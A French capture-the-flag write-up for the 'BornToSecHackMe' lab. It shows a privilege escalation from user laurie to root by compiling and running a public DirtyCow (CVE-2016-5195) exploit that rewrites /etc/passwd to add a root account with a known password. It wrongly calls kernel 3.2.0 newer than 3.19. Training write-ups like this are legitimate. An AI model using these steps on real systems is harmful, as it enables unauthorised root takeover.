### PRECISION

Comme pour le premier writeup les adresses IP peuvent changer donc il faudra bien adapter les IP en fonction du reseau.

### laurie

Pour cet exploit reprenons directement après etre log en tant que lmezard.

```
ssh laurie@192.168.1.27
```

En cherchant un peu sur internet les differentes vulnerabilités que presente le noyau linux (et surtout le notre, c'est ce qui nous interesse), nous trouvons bon nombre d'articles.

Un compte GitHub liste pas mal de payloads en ce qui concerne les privileges escalation :

[Linux - Privilege Escalation](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md)

Tout en bas nous voyons plusieurs exploits disponibles et celui qui va nous interesser ici sera le CVE-2016-5195 (DirtyCow) Linux Privilege Escalation - Linux Kernel <= 3.19.0-73.8

En effet chez nous la version est plus recente que 3.19 :

```
laurie@BornToSecHackMe:~$ uname -a
Linux BornToSecHackMe 3.2.0-91-generic-pae #129-Ubuntu SMP Wed Sep 9 11:27:47 UTC 2015 i686 i686 i386 GNU/linux
```

On va donc essayer d'utiliser cet exploit :

[PoCs](https://github.com/evait-security/ClickNRoot/blob/master/1/exploit.c)


Ce dernier va generer un nouveau fichier /etc/passwd tout en gardant le vrai intact pour qu'on le restaure après.

Il nous suffit de copy/paste le code puis de le compiler et d'executer le programme pour pouvoir se log en tant que root.

```
laurie@BornToSecHackMe:/tmp$ gcc dirty.c -o dirty -pthread -lcrypt
laurie@BornToSecHackMe:/tmp$ ./dirty
/etc/passwd successfully backed up to /tmp/passwd.bak
Please enter the new password:
Complete line:
evait:fiY9IH9EEmntk:0:0:pwned:/root:/bin/bash

mmap: b7fda000
madvise 0

ptrace 0
Done! Check /etc/passwd to see if the new user was created
You can log in with username evait and password pwn.


DON'T FORGET TO RESTORE /etc/passwd FROM /tmp/passwd.bak !!!

Done! Check /etc/passwd to see if the new user was created
You can log in with username evait and password pwn.


DON'T FORGET TO RESTORE /etc/passwd FROM /tmp/passwd.bak !!!

laurie@BornToSecHackMe:/tmp$ su evait
Password:
evait@BornToSecHackMe:/tmp# id
uid=0(evait) gid=0(root) groups=0(root)
evait@BornToSecHackMe:/tmp# cd /root
evait@BornToSecHackMe:~# cat README
CONGRATULATIONS !!!!
To be continued...
```

Et voila encore une fois nous sommes root !
